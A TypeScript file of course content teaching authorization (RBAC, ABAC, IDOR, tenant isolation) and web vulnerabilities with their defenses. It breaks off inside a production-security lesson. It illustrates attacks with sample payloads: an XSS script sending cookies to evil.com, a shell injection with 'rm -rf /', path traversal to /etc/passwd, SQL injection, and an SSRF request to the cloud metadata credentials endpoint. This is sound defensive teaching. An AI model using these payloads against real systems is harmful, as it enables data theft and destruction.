import { FptLessonContent, RecipeLessonContent } from '../types';

export const LESSON_6_3: FptLessonContent = {
  mode: 'theory_first',
  introduction: {
    summaryMarkdown: [
      'Your server has verified the caller’s cookie or JWT—so you know for a fact that this request came from `user_id = 42` inside `org_id = 7`. Knowing *who* is knocking is only half the battle. Now comes the harder question: **“Is user 42 actually allowed to read, modify, or delete *this specific thing*?”**',
      'In this unit, we’ll build authorization from first principles: **identity vs. permissions**, **RBAC vs. ABAC**, **resource-level ownership and permission inheritance**, **multi-tenant isolation**, **centralized policy enforcement**, and **preventing IDOR vulnerabilities**.',
    ].join('\n\n'),
    whyItMattersMarkdown:
      'Broken Access Control consistently sits at #1 on the OWASP Top 10. Authentication only proves identity; without airtight authorization on every query and mutation, any ordinary signed-in account can quietly read or hijack other customers’ data.',
    prerequisites: [
      {
        subBlockId: '6.1',
        label: 'Authentication vs Authorization (6.1.4)',
        detail: 'Distinguishing identity verification (401) from permission evaluation (403).',
      },
      {
        subBlockId: '6.2',
        label: 'Verified session/token identity (6.2)',
        detail: 'Knowing that `req.user` comes from a verified server session or signed JWT.',
      },
    ],
  },
  topicSections: [
    {
      id: 'topic-6.3.1',
      topicId: '6.3.1',
      coveredTopicIds: ['6.3.2', '6.3.3'],
      title: 'Identity vs permissions, RBAC, and ABAC',
      problemAndRequirementsMarkdown: [
        '### First principles: Why “is logged in” is almost never enough',
        'Imagine building a SaaS project tracker. Alice logs in as a `member` of Acme Corp. Should Alice be able to export Acme’s billing invoices? Probably not—only an `admin` or `billing_manager` should. Even worse, what if Alice is an `editor`, but she tries to publish a document that is already marked `archived` or locked to the `legal` department?',
        '',
        'Notice what we need to express: rules that map **(Who) + (Action) + (What / Context)** to **Allow or Deny**—without scattering fragile `if (user.email === "bob@...")` hacks across 50 routes.',
      ].join('\n\n'),
      conceptAndMechanismMarkdown: [
        '### How access models evolve in complexity',
        '1. **Identity vs. Permissions**: **Identity** is *who you are* (`userId: "u_42"`). **Permissions** are *what capabilities you hold* (`invoices:read`, `projects:delete`). Never bake permanent business assumptions straight into `userId` checks; resolve identity first, then evaluate permissions.',
        '2. **Role-Based Access Control (RBAC)**: Instead of assigning 30 individual permission flags to every user, you group permissions into **Roles** (`viewer`, `editor`, `admin`) and assign users to roles:',
        '   - `admin` → `[project:read, project:write, billing:manage, users:invite]`',
        '   - `viewer` → `[project:read]`',
        '   - **Why it works**: Clean, fast, and auditable. Route middleware checks `requirePermission("billing:manage")` rather than hardcoding role names everywhere.',
        '3. **Attribute-Based Access Control (ABAC)**: What if permissions depend on **runtime attributes** of the user, the resource, or the environment? For example: *“An author can edit a draft document ONLY if `doc.status === \'draft\'` AND `user.department === doc.department` AND `request.time` is during business hours.”* ABAC evaluates policies against attributes instead of static role labels alone.',
      ].join('\n\n'),
      centralIdeaSummary:
        'Identity proves who the user is, RBAC grants capabilities through roles, and ABAC adds fine-grained attribute conditions when static roles aren’t expressive enough.',
      codeExamples: [
        {
          snippet: {
            id: '6.3-rbac-abac-code',
            title: 'Moving from role labels (RBAC) to attribute rules (ABAC)',
            language: 'typescript',
            code: `// 1. RBAC: Role -> capability set
const ROLE_PERMISSIONS = {
  viewer: new Set(["doc:read"]),
  editor: new Set(["doc:read", "doc:write"]),
  admin:  new Set(["doc:read", "doc:write", "doc:delete", "billing:manage"]),
} as const;

type Role = keyof typeof ROLE_PERMISSIONS;

interface UserContext {
  userId: string;
  orgId: string;
  role: Role;
  department: string;
}

interface DocumentRecord {
  id: string;
  orgId: string;
  ownerId: string;
  department: string;
  status: "draft" | "locked";
}

// 2. Hybrid RBAC + ABAC policy check
function canEditDocument(user: UserContext, doc: DocumentRecord): boolean {
  if (!ROLE_PERMISSIONS[user.role].has("doc:write")) return false; // RBAC capability
  if (user.orgId !== doc.orgId) return false;                       // Tenant boundary
  if (doc.status === "locked" && user.role !== "admin") return false; // ABAC attribute
  return doc.ownerId === user.userId || user.department === doc.department;
}`,
          },
          lineByLineMarkdown:
            '- Checking `ROLE_PERMISSIONS[user.role].has("doc:write")` enforces RBAC using capabilities instead of scattering `role === "editor" || role === "admin"` everywhere.\n- Checking `doc.status === "locked"` and `department` adds ABAC context directly on the target document.',
        },
      ],
    },
    {
      id: 'topic-6.3.4',
      topicId: '6.3.4',
      coveredTopicIds: ['6.3.5', '6.3.6'],
      title: 'Resource-level authorization, ownership checks, and permission inheritance',
      problemAndRequirementsMarkdown: [
        '### First principles: When middleware checks aren’t enough',
        'Suppose you write middleware `requireRole("editor")` on `PATCH /comments/:commentId`. Alice is legitimately an `editor`—so she passes the middleware! Now she sends `PATCH /comments/999`, where comment `999` was written by *Bob* in a completely different private folder.',
        '',
        'Route-level middleware only knows **who** Alice is and **what route** she called. It has no idea **who owns row #999** inside Postgres until the record (or its parent) is fetched!',
      ].join('\n\n'),
      conceptAndMechanismMarkdown: [
        '### Deriving the mechanisms',
        '1. **Resource-Level Authorization**: Decisions made *against a specific target record*, not just an endpoint. You can’t authorize `DELETE /invoices/88` solely from the JWT; you must inspect invoice `88`.',
        '2. **Ownership Checks**: The simplest resource check is comparing the authenticated user against the resource’s owner column: `invoice.userId === req.user.id`—or even better, baking the ownership filter straight into the SQL query (`DELETE FROM invoices WHERE id = $1 AND user_id = $2`).',
        '3. **Permission Inheritance**: Real apps have hierarchies: **Organization → Workspace → Folder → Document → Comment**. Instead of duplicating permissions onto 50,000 comments, a resource inherits access from its parent container—e.g. *“Anyone with `editor` role on `Folder A` inherits edit rights on all documents inside `Folder A` unless a tighter rule overrides it.”*',
      ].join('\n\n'),
      edgeCasesAndTradeOffsMarkdown: [
        '### Important subtle edge case: `403 Forbidden` vs `404 Not Found`',
        'If Alice requests `GET /documents/999` belonging to another company, returning `403 Forbidden` leaks a tiny clue: *“Document #999 exists, you just can’t see it!”* For sensitive multi-tenant resources, teams intentionally scope the `WHERE` clause (`WHERE id = $1 AND org_id = $2`) and return **`404 Not Found`** so outsiders cannot even confirm whether an ID exists.',
      ].join('\n\n'),
      centralIdeaSummary:
        'Route checks cannot protect individual records; enforce resource-level ownership and hierarchical permission inheritance against actual stored records.',
      codeExamples: [],
    },
    {
      id: 'topic-6.3.7',
      topicId: '6.3.7',
      coveredTopicIds: ['6.3.8', '6.3.9'],
      title: 'Tenant isolation, centralized policy enforcement, and IDOR prevention',
      problemAndRequirementsMarkdown: [
        '### First principles: The most common real-world API bug (IDOR)',
        'What is **IDOR (Insecure Direct Object Reference)**? It’s shockingly simple: an endpoint takes an object identifier from the client (`/api/orders/1042`, `?accountId=88`, or `{ "fileId": "f_9" }`) and fetches that row directly **without verifying the authenticated caller is authorized to touch it**.',
        '',
        'In a B2B SaaS app where Company A and Company B share the same PostgreSQL tables, forgetting `AND org_id = $2` on *one single report endpoint* allows a user at Company A to loop `id = 1, 2, 3...` and dump Company B’s entire customer list!',
      ].join('\n\n'),
      conceptAndMechanismMarkdown: [
        '### How production backends eliminate IDOR and tenant leaks systematically',
        '1. **Tenant Isolation**: Every tenant-owned table carries `org_id` (or `tenant_id`). Never trust `orgId` sent in a request body when the caller belongs to only one session org—derive `tenantId` exclusively from the verified session/JWT, and require every repository query to accept `tenantId` as a mandatory parameter (or enforce PostgreSQL **Row-Level Security (RLS)** as a database defense-in-depth layer!).',
        '2. **IDOR Prevention Checklist**:',
        '   - Never trust client-supplied `user_id` or `org_id` in request bodies/query params for authorization—always take identity from the verified auth context.',
        '   - Scope database lookups directly by `(id, owner_or_tenant_id)`—not `findById(id)` followed by hoping every engineer remembers an `if` check afterward.',
        '   - Treat sequential IDs (`1, 2, 3`) vs UUIDs carefully: UUIDs reduce easy guessing, **but UUIDs are NOT authorization!** If a leaked UUID grants access without an ownership check, it is still an IDOR bug.',
        '3. **Policy Enforcement**: Scattering `if` statements across 40 controllers guarantees someone will miss one edge case. Instead, centralize authorization rules in a **Policy / Authorization Service** (e.g., `authorize(actor, "invoice:void", invoice)` defaulting to **deny by default**) so every service entry point calls one tested source of truth.',
      ].join('\n\n'),
      centralIdeaSummary:
        'Prevent IDOR and cross-tenant leaks by scoping every data query to server-verified identity/tenant context and routing decisions through centralized, deny-by-default policy enforcement.',
      codeExamples: [
        {
          snippet: {
            id: '6.3-idor-policy',
            title: 'Preventing IDOR via tenant-scoped queries + centralized policy check',
            language: 'typescript',
            code: `// Centralized deny-by-default Policy Engine
class ForbiddenError extends Error {
  status = 403;
}

export function assertCanDeleteInvoice(
  actor: { userId: string; orgId: string; role: "member" | "admin" },
  invoice: { id: string; orgId: string; createdBy: string }
): void {
  // Always enforce tenant boundary first
  if (invoice.orgId !== actor.orgId) {
    throw new ForbiddenError("Cross-tenant access denied");
  }
  // Admins can delete org invoices; members only their own drafts
  if (actor.role === "admin" || invoice.createdBy === actor.userId) {
    return;
  }
  throw new ForbiddenError("Insufficient permissions for this invoice");
}

// Repository helper baked with tenant scope (defense against forgotten checks)
async function findInvoiceForTenant(db: any, invoiceId: string, orgId: string) {
  return db.queryOne(
    "SELECT id, org_id, created_by FROM invoices WHERE id = $1 AND org_id = $2",
    [invoiceId, orgId] // orgId comes from verified auth context, NEVER req.body!
  );
}`,
          },
          lineByLineMarkdown:
            '- `findInvoiceForTenant` requires `orgId` at the data-access boundary so cross-tenant reads fail closed.\n- `assertCanDeleteInvoice` keeps role + ownership rules in one testable function instead of repeating `if` blocks in controllers.',
        },
      ],
    },
  ],
  conceptConnection: {
    title: 'Layered authorization from HTTP edge down to PostgreSQL row',
    narrativeMarkdown: [
      'Notice how clean authorization becomes when you stack coarse checks at the edge and fine-grained checks inside the service/database:',
      '1. **AuthN middleware** extracts verified `(userId, orgId, role)` (`6.2`).',
      '2. **Coarse RBAC check** rejects roles that never have the capability (e.g., `viewer` hitting `DELETE`).',
      '3. **Tenant-scoped fetch** pulls the target resource using `orgId` from the verified token.',
      '4. **Policy enforcement** evaluates ownership, parent folder inheritance, and ABAC status flags before mutating state.',
    ].join('\n\n'),
    integratedExample: {
      id: '6.3-integrated-example',
      title: 'Deny-by-default authorization pipeline',
      language: 'text',
      code: `Request: DELETE /invoices/inv_912
  1. Verified Token   -> actor = { userId: "u_4", orgId: "org_A", role: "member" }
  2. Tenant Scope SQL -> SELECT * FROM invoices WHERE id = 'inv_912' AND org_id = 'org_A'
                        (Wait: if inv_912 belongs to org_B -> returns 0 rows -> 404! IDOR blocked.)
  3. Policy Check     -> Is actor admin OR (creator === "u_4" AND status === "draft")?
                        No -> throw 403 Forbidden (Deny by default!)
  4. Mutate           -> Execute deletion inside org_A boundary`,
    },
    walkthroughMarkdown:
      'Every step narrows risk: even if a developer accidentally opens a route to `member`, the tenant-scoped query and centralized policy prevent cross-org or unauthorized mutations.',
  },
  questions: [
    {
      id: '6.3-kc-1',
      focusArea: 'RBAC vs ABAC & Resource Checks',
      prompt:
        'Suppose your Express middleware checks `requireRole("editor")` on `PATCH /docs/:id`. Why does that still leave your app vulnerable—and when would you combine **resource-level ownership** with **ABAC**?',
      hints: [
        'Does `requireRole("editor")` know which organization or user owns document `:id`?',
        'What if an editor tries to modify another company’s document, or edit a document whose `status` is `locked`?',
        '`requireRole` only checks static user capability, not the target row; you need resource/tenant ownership checks to block IDOR and ABAC attributes (like `doc.status !== "locked"`) to enforce state/context rules.',
      ],
      explanation:
        'Route middleware only sees the caller’s role, not the properties of record `:id`. An editor from Company A could modify Company B’s document (IDOR). You must load or scope the record for **resource-level ownership / tenant isolation**, and use **ABAC** when rules depend on resource or context attributes like `doc.status === "draft"` or department.',
      evaluationCriteria: [
        'Explains that route-level RBAC cannot inspect target resource ownership or tenant',
        'Distinguishes resource/ownership check from ABAC attribute condition',
      ],
      topicIds: ['6.3.2', '6.3.3', '6.3.4', '6.3.5'],
    },
    {
      id: '6.3-kc-2',
      focusArea: 'IDOR & Tenant Isolation',
      prompt:
        'A team switches primary keys in `GET /reports/:id` from sequential integers (`101, 102`) to random UUIDs (`v4`), thinking that fixes an **IDOR** bug. Why is that still broken, and how do you fix **IDOR** and **tenant isolation** properly?',
      hints: [
        'What happens if a UUID appears in a browser history, log, Slack screenshot, or referral header?',
        'Does guessing difficulty equal authorization?',
        'UUIDs only add obscurity, not authorization; any leaked UUID still exposes data unless every query and policy check verifies `org_id` / ownership from the verified session.',
      ],
      explanation:
        'Random UUIDs only make IDs harder to guess—they do not verify permission. If a UUID leaks via logs, shared links, or `Referer` headers, an attacker can still access the record. True **IDOR prevention** and **tenant isolation** derive `userId`/`orgId` solely from the verified auth context and enforce them inside every query and centralized **policy check**.',
      evaluationCriteria: [
        'Clarifies that UUIDs are obscurity, not authorization',
        'Requires server-side ownership/tenant scoping from verified auth context',
      ],
      topicIds: ['6.3.7', '6.3.8', '6.3.9'],
    },
    {
      id: '6.3-kc-3',
      focusArea: 'Permission Inheritance & Policy Enforcement',
      prompt:
        'In a workspace app (`Organization -> Folder -> File`), why is **permission inheritance** preferred over copying user permission rows onto every file—and why should policy checks live in a centralized **policy enforcement** module?',
      hints: [
        'Think about what happens when an organization revokes a user’s access from a folder containing 10,000 files.',
        'What happens when 20 API routes duplicate slightly different `if` checks?',
        'Inheritance lets permissions cascade cleanly from parent containers without syncing 10,000 stale rows, while centralized policy enforcement ensures consistent deny-by-default rules across every route.',
      ],
      explanation:
        'Copying permissions onto every child file creates massive fan-out updates and stale permission bugs whenever access changes. **Permission inheritance** evaluates effective access from the container hierarchy (with explicit overrides when needed), while **centralized policy enforcement** keeps deny-by-default rules consistent across all routes.',
      evaluationCriteria: [
        'Explains fan-out/consistency benefit of inheritance over copying per-item permissions',
        'Explains consistency/auditability benefit of centralized policy enforcement',
      ],
      topicIds: ['6.3.1', '6.3.6', '6.3.8'],
    },
  ],
};

export const LESSON_6_4: FptLessonContent = {
  mode: 'theory_first',
  introduction: {
    summaryMarkdown: [
      'Most devastating web vulnerabilities share **one single root cause**: mixing **untrusted user bytes** directly into **trusted instructions** (SQL queries, HTML DOM, shell commands, URL fetchers, file paths, or object decoders). When data is allowed to masquerade as code, attackers rewrite what your program executes.',
      'In this unit, we’ll examine the classic **Application Security** vulnerabilities from first principles: **SQL injection & parameterized queries**, **XSS, CSRF & CORS**, **SSRF, path traversal & command injection**, **unsafe deserialization**, and **input validation vs. output encoding**.',
    ].join('\n\n'),
    whyItMattersMarkdown:
      'Memorizing vulnerability names helps nobody; understanding the boundary between *data* and *executable syntax* lets you spot injection bugs across SQL, shells, browsers, file systems, and internal HTTP clients automatically.',
    prerequisites: [
      {
        subBlockId: '6.1',
        label: 'Trust boundaries & untrusted input (6.1.1)',
        detail: 'Recognizing every HTTP param, header, body, and uploaded file as untrusted.',
      },
      {
        subBlockId: '4.1',
        label: 'Relational queries & SQL parsing (4.1)',
        detail: 'Knowing how SQL databases parse query strings versus bound values.',
      },
    ],
  },
  topicSections: [
    {
      id: 'topic-6.4.1',
      topicId: '6.4.1',
      coveredTopicIds: ['6.4.2', '6.4.8', '6.4.7'],
      title: 'Injection flaws: SQL injection, parameterized queries, command injection & path traversal',
      problemAndRequirementsMarkdown: [
        '### First principles: Why string concatenation turns data into code',
        'Suppose you write `"SELECT * FROM users WHERE email = \'" + email + "\'"`. As long as the user types `alice@example.com`, Postgres sees a normal string literal. Now suppose an attacker sends `\' OR 1=1 --`. Because you glued raw user text into the SQL **command string**, the database parser can’t tell where your SQL template ends and the user’s input begins—it executes `OR 1=1` as SQL logic!',
        '',
        'The *exact same flaw* happens in two other places:',
        '- Running shell commands via string glue (`exec("convert " + filename)`) where `filename` is `photo.png; rm -rf /` (**Command Injection**).',
        '- Gluing a filename onto a base folder (`path.join("/uploads", req.query.file)`) where `file` is `../../etc/passwd` (**Path Traversal**).',
      ].join('\n\n'),
      conceptAndMechanismMarkdown: [
        '### How each injection flaw works and how to kill it structurally',
        '1. **SQL Injection (SQLi) & Parameterized Queries**:',
        '   - **Why escaping fails**: Trying to strip quotes manually breaks legitimate names (`O\'Brien`) and misses encoding edge cases.',
        '   - **Parameterized Queries (Prepared Statements)**: You send the SQL template (`SELECT * FROM users WHERE email = $1`) **separately** from the parameter value (`[email]`). The database compiles the query plan *first*, then slots `$1` in strictly as a **data literal**—even if `$1` contains `\' OR 1=1 --`, Postgres searches for an email literally equal to that weird string. SQLi becomes structurally impossible for values!',
        '   - *(Watch out for identifiers!)* Table names, column names, and `ASC/DESC` cannot use `$1` parameters; allow-list them against an explicit `Map` or enum!',
        '2. **Command Injection**: Never invoke a shell (`sh -c` / `exec`) with user strings. Prefer native libraries (e.g., `sharp` instead of shelling out to `convert`), or if spawning a process is unavoidable, use `execFile(cmd, [arg1, arg2])` with `shell: false` so arguments stay data, not shell metacharacters (`;`, `|`, `$(...)`).',
        '3. **Path Traversal**: Resolve the canonical path (`const resolved = path.resolve(BASE_DIR, userInput)`) and verify `resolved.startsWith(BASE_DIR + path.sep)`—or better yet, store files under server-generated UUID names so user strings never touch the filesystem path!',
      ].join('\n\n'),
      centralIdeaSummary:
        'Keep untrusted data strictly separate from SQL, shell, and filesystem parsers using parameterized queries, argument arrays without shells, and canonical path containment.',
      codeExamples: [
        {
          snippet: {
            id: '6.4-injection-examples',
            title: 'Vulnerable string glue vs. safe structural separation',
            language: 'typescript',
            code: `import path from "node:path";
import { execFile } from "node:child_process";

// 1. SQLi fix: Parameterized query (template & values sent separately)
// BAD:  db.query(\`SELECT * FROM users WHERE email = '\${email}'\`)
const user = await db.query("SELECT id, email FROM users WHERE email = $1", [email]);

// Dynamic ORDER BY (can't parameterize identifiers -> strict allow-list!)
const ALLOWED_SORT = new Map([["created", "created_at"], ["name", "full_name"]]);
const sortCol = ALLOWED_SORT.get(req.query.sort) ?? "created_at";

// 2. Command injection fix: Never pass user strings through a shell
// BAD:  exec(\`exiftool \${filePath}\`)
execFile("exiftool", ["-j", safeFilePath], { shell: false }, cb);

// 3. Path traversal fix: Resolve and enforce containment inside BASE_DIR
const BASE_DIR = path.resolve("/var/app/uploads");
const target = path.resolve(BASE_DIR, String(req.query.name));
if (!target.startsWith(BASE_DIR + path.sep)) {
  throw new Error("Path traversal blocked");
}`,
          },
          lineByLineMarkdown:
            '- `$1` guarantees Postgres treats `email` purely as data, never SQL syntax.\n- Allow-listing `sortCol` handles SQL identifiers that parameters cannot bind.\n- `path.resolve` collapses `../` segments before checking `startsWith(BASE_DIR + path.sep)`.',
        },
      ],
    },
    {
      id: 'topic-6.4.3',
      topicId: '6.4.3',
      coveredTopicIds: ['6.4.4', '6.4.5'],
      title: 'Browser-side traps: XSS, CSRF, and CORS with preflight requests',
      problemAndRequirementsMarkdown: [
        '### First principles: Why browsers need three completely different protections',
        'Imagine three different browser attacks that developers constantly confuse:',
        '- **Attack 1 (XSS)**: An attacker puts `<script>fetch("https://evil.com/?c="+document.cookie)</script>` in their profile bio. Every victim whose browser renders that bio runs the attacker’s JavaScript inside *your* site’s origin!',
        '- **Attack 2 (CSRF)**: A user is logged into `bank.com` via a session cookie. They visit `evil-blog.com`, which secretly submits `<form action="https://bank.com/transfer" method="POST">`. The browser helpfully attaches `bank.com`’s cookie automatically, transferring money without permission!',
        '- **Attack 3 (Cross-Origin Reads / CORS)**: `evil-blog.com` uses `fetch("https://bank.com/api/balance", { credentials: "include" })` trying to *read* the user’s balance in JavaScript. Why must the browser block `evil-blog.com` from reading `bank.com`’s response unless `bank.com` explicitly opts in?',
      ].join('\n\n'),
      conceptAndMechanismMarkdown: [
        '### Understanding each mechanism cleanly',
        '1. **Cross-Site Scripting (XSS)**: Untrusted text gets interpreted as executable HTML/JS in a victim’s browser.',
        '   - **Defense**: **Context-aware output encoding** (escape `<`, `>`, `&`, `"` before inserting into HTML; React JSX does this by default—never bypass it with `dangerouslySetInnerHTML` on untrusted HTML without strict sanitization), plus `HttpOnly` cookies so even if XSS happens, JS cannot read session cookies, plus **Content-Security-Policy (CSP)** headers.',
        '2. **Cross-Site Request Forgery (CSRF)**: Exploits the fact that browsers **automatically attach cookies** on cross-site requests.',
        '   - **Defense**:',
        '     - `SameSite=Lax` (or `Strict`) on session cookies blocks cross-site `POST` forms/XHR from carrying your cookie.',
        '     - **CSRF Tokens** (Synchronizer / Double-Submit): Require an unguessable secret token in a custom header/form field alongside the cookie; `evil-blog.com` cannot read or guess it.',
        '     - Notice: Pure `Authorization: Bearer <token>` headers stored outside cookies aren’t auto-sent by browsers, making them naturally immune to CSRF (though vulnerable to XSS if stored in `localStorage`!).',
        '3. **CORS and Preflight Requests**: Browsers enforce the **Same-Origin Policy (SOP)** by default: JS on `https://app.com` cannot read responses from `https://api.other.com` (different scheme, domain, or port).',
        '   - **CORS (Cross-Origin Resource Sharing)** is how a backend tells the browser which foreign origins *may read* its responses (`Access-Control-Allow-Origin: https://app.com` + `Access-Control-Allow-Credentials: true`).',
        '   - **Preflight (`OPTIONS`)**: Before a non-simple cross-origin request (`DELETE`, custom `Authorization` header, or `application/json` `POST`), the browser sends a lightweight **`OPTIONS` preflight request** asking *“May `https://app.com` send `DELETE` with `Authorization`?”* Your backend answers with `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers` before the real request runs.',
        '   - **Crucial trap**: **CORS is NOT a security wall against `curl` or attackers’ servers!** Only browsers enforce CORS. Never mistake CORS for authentication or CSRF protection—and NEVER echo back an arbitrary `Origin` header alongside `Access-Control-Allow-Credentials: true`!',
      ].join('\n\n'),
      centralIdeaSummary:
        'Prevent XSS by output-encoding untrusted text, prevent CSRF with SameSite cookies and CSRF tokens, and configure CORS strictly as an allow-list for legitimate browser origins.',
      codeExamples: [],
    },
    {
      id: 'topic-6.4.6',
      topicId: '6.4.6',
      coveredTopicIds: ['6.4.9', '6.4.10'],
      title: 'SSRF, deserialization vulnerabilities, and input validation vs output encoding',
      problemAndRequirementsMarkdown: [
        '### First principles: When your server becomes the attacker’s proxy—or executes malicious payloads',
        '1. **Server-Side Request Forgery (SSRF)**: Suppose your app lets users paste an avatar URL (`"https://example.com/pic.png"`) and your backend runs `fetch(userUrl)` to generate a preview. What happens if an attacker submits `"http://169.254.169.254/latest/meta-data/iam/security-credentials/"` or `"http://127.0.0.1:5432"`? Your *server* lives inside your private cloud VPC—so your server just fetched AWS cloud metadata secrets or probed internal admin ports on the attacker’s behalf!',
        '2. **Deserialization Vulnerabilities**: Turning raw wire bytes (Java serialized objects, Python `pickle`, PHP `unserialize`, or careless `JSON.parse` + prototype pollution `__proto__`) back into live in-memory objects. Formats like `pickle` or Java `ObjectInputStream` can execute arbitrary code *during parsing itself* before your logic even sees the object!',
      ].join('\n\n'),
      conceptAndMechanismMarkdown: [
        '### Locking down SSRF, deserialization, and the Validation vs. Encoding rule',
        '1. **Preventing SSRF**: Never let users make arbitrary outbound requests from your VPC. Restrict schemes strictly to `https:`, resolve DNS **once**, block all private/loopback/link-local IP ranges (`127.0.0.0/8`, `10.0.0.0/8`, `169.254.169.254`, `::1`, etc.) *after* DNS resolution (to defeat DNS rebinding), disable automatic HTTP redirects (or re-validate redirect targets), and ideally route user URL fetches through an isolated egress proxy with no internal VPC access.',
        '2. **Preventing Deserialization Vulnerabilities**: Never feed untrusted bytes to code-capable serializers (`pickle`, `yaml.load` unsafe mode, Java `ObjectInputStream`). Use safe data-only formats like strict JSON validated through Zod schemas (`schema.safeParse`), and reject/strip dangerous keys like `__proto__` or `constructor`.',
        '3. **Input Validation vs. Output Encoding** *(two distinct jobs!)*:',
        '   - **Input Validation**: Checked **on entry** at the trust boundary (`"Is `age` an integer 0..150? Is `url` valid HTTPS?"`). Reject invalid types/shapes immediately (`400 Bad Request`).',
        '   - **Output Encoding**: Applied **on exit** right before handing data to a downstream interpreter (HTML-encoding before sending to DOM, URL-encoding before building query strings, parameterizing before sending to SQL). Why both? Because valid data like `O\'Connor <3` passes input validation cleanly—yet would still break HTML or raw SQL without proper encoding/parameterization at output!',
      ].join('\n\n'),
      centralIdeaSummary:
        'Block SSRF by rejecting private/metadata IPs on resolved outbound fetches, avoid unsafe object deserializers, and pair entry Input Validation with interpreter-specific Output Encoding.',
      codeExamples: [],
    },
  ],
  conceptConnection: {
    title: 'How every injection and boundary defense fits one rule',
    narrativeMarkdown: [
      'Notice the single unifying thread running through all ten topics in `6.4`:',
      '- **Data enters** → **Validate** shape & types at the trust boundary (`Zod`, length limits, allow-lists).',
      '- **Data touches an interpreter** → Separate structure from data (`$1` SQL parameters, `execFile` args, `path.resolve` containment, safe JSON parsing, private-IP blocking on outbound fetches, HTML output encoding).',
      '- **Browser makes cross-origin requests** → Explicitly guard cookie-carrying state changes (`SameSite` + CSRF tokens) and allow-list browser cross-origin reads (`CORS`).',
    ].join('\n\n'),
    integratedExample: {
      id: '6.4-integrated-example',
      title: 'Map of Untrusted Input -> Target Interpreter -> Structural Defense',
      language: 'text',
      code: `Interpreter / Boundary      Attack              Structural Defense
──────────────────────────────────────────────────────────────────────────
SQL Database              SQL Injection       Parameterized queries ($1) + identifier allow-list
Browser DOM               XSS                 Context output encoding + HttpOnly + CSP
Browser Cookie Auto-Send  CSRF                SameSite=Lax/Strict + CSRF token
Cross-Origin Browser JS   CORS Leak           Strict Origin allow-list (never wildcard + creds)
Server Outbound HTTP      SSRF                Resolve DNS -> block private/169.254.x IPs -> fetch
OS Filesystem             Path Traversal      UUID filenames OR path.resolve + startsWith(BASE)
OS Shell                  Command Injection   Native APIs or execFile(cmd, args, { shell: false })
Object Parser             Deserialization     Data-only JSON + strict schema validation (Zod)`,
    },
    walkthroughMarkdown:
      'Whenever your backend hands user-derived bytes to *any* external engine—a database, a shell, a filesystem, an HTTP client, or a browser—ask: *“Can these bytes alter the syntax or destination of the command?”* If yes, apply structural separation.',
  },
  questions: [
    {
      id: '6.4-kc-1',
      focusArea: 'SQLi & Parameterized Queries',
      prompt:
        'Why are **parameterized queries** (`WHERE email = $1`) fundamentally safer against **SQL injection** than writing a helper function that strips or escapes single quotes—and what happens when you need dynamic `ORDER BY` sorting?',
      hints: [
        'What does the database do with a query string versus a `$1` parameter?',
        'Can `$1` bind a column name like `ORDER BY $1`?',
        'Parameterized queries separate SQL syntax from data values at the protocol/parser level; column/table identifiers cannot be bound via `$1`, so dynamic sorting requires a strict server-side allow-list.',
      ],
      explanation:
        'With parameterized queries, the database compiles the SQL template separately from parameter values so `$1` is always parsed strictly as literal data, never SQL keywords or operators. Escaping helpers easily break on encodings or multi-byte characters. Because SQL parameters cannot bind identifiers like column names, dynamic `ORDER BY` clauses must map input against a strict allow-list.',
      evaluationCriteria: [
        'Explains separation of SQL structure/plan from literal parameter values',
        'Notes identifier allow-listing for dynamic column/table names',
      ],
      topicIds: ['6.4.1', '6.4.2'],
    },
    {
      id: '6.4-kc-2',
      focusArea: 'XSS, CSRF & CORS',
      prompt:
        'Clearly distinguish **XSS**, **CSRF**, and **CORS**. Specifically: if an API enables `Access-Control-Allow-Origin: https://myapp.com`, does that stop **CSRF** or stop a `curl` script from hitting the API?',
      hints: [
        'Which attack injects JavaScript into *your* page vs. tricks a victim’s browser into sending cookies cross-site?',
        'Does `curl` read `Access-Control-Allow-Origin` headers, or do HTML `<form>` posts even trigger preflight?',
        'XSS runs malicious JS in the victim’s DOM; CSRF abuses automatic cookie attachment on cross-site requests; CORS only governs browser JS reading responses—it does not stop `curl` or simple `<form>` CSRF requests.',
      ],
      explanation:
        '**XSS** injects executable scripts into your site’s origin (stopped by output encoding/CSP). **CSRF** tricks a logged-in user’s browser into auto-attaching session cookies on cross-site state changes (stopped by `SameSite` cookies + CSRF tokens). **CORS** only instructs browsers which origins may *read* cross-origin JS responses (handling `OPTIONS` preflight for non-simple requests)—it never blocks `curl` or simple cross-site `<form>` CSRF submissions.',
      evaluationCriteria: [
        'Accurately distinguishes XSS, CSRF, and CORS',
        'Explains why CORS does not stop `curl` or replace CSRF protection',
      ],
      topicIds: ['6.4.3', '6.4.4', '6.4.5'],
    },
    {
      id: '6.4-kc-3',
      focusArea: 'SSRF, Deserialization & Validation vs Encoding',
      prompt:
        'Why is **input validation** alone insufficient against XSS/SQLi (why do we also need **output encoding** / parameterization)—and how would an attacker abuse an unchecked webhook or image-fetch URL via **SSRF**?',
      hints: [
        'Consider a legitimate customer last name like `O\'Connor` or math comment `x < y`. Should input validation reject those?',
        'What internal IP addresses can a cloud EC2/container server reach that the public internet cannot?',
        'Legitimate inputs like `O\'Connor` or `a < b` pass validation yet require output encoding/parameterization for SQL/HTML; SSRF lets attackers hijack server `fetch()` calls to probe `127.0.0.1`, VPC services, or `169.254.169.254` metadata.',
      ],
      explanation:
        '**Input validation** verifies structural correctness on entry (`email`, ranges, types), while **output encoding** neutralizes special characters for a specific destination (HTML `<`, SQL params)—legitimate inputs like `O\'Connor` or `5 < 10` should pass validation cleanly. **SSRF** happens when a server fetches a user-supplied URL without resolving DNS and blocking private/loopback/cloud-metadata IPs (`169.254.169.254`), turning your backend into an internal network proxy.',
      evaluationCriteria: [
        'Distinguishes entry input validation from destination-specific output encoding',
        'Explains SSRF abuse against internal/metadata endpoints and IP-blocking defense',
      ],
      topicIds: ['6.4.6', '6.4.7', '6.4.8', '6.4.9', '6.4.10'],
    },
  ],
};

export const LESSON_6_5_FPT: FptLessonContent = {
  mode: 'theory_first',
  introduction: {
    summaryMarkdown: [
      'Your authentication works, your authorization stops IDOR, and your queries are parameterized. You deploy to production—and within an hour, two things happen: a bot hammers `POST /login` 5,000 times per second guessing passwords, a user uploads a 2 GB JSON payload crashing Node’s heap, and an old third-party npm package turns out to have a known CVE.',
      'In this unit, we’ll examine **Production Security** controls: **rate limiting, brute-force protection & API quotas**, **secret management & key rotation**, **audit logging**, **request size limits**, **security headers**, and **dependency vulnerability scanning**.',
    ].join('\n\n'),
    whyItMattersMarkdown:
      'Production security protects **availability**, limits the blast radius when credentials or packages fail, and gives you forensic proof of *who did what and when* after an incident.',
    prerequisites: [
      {
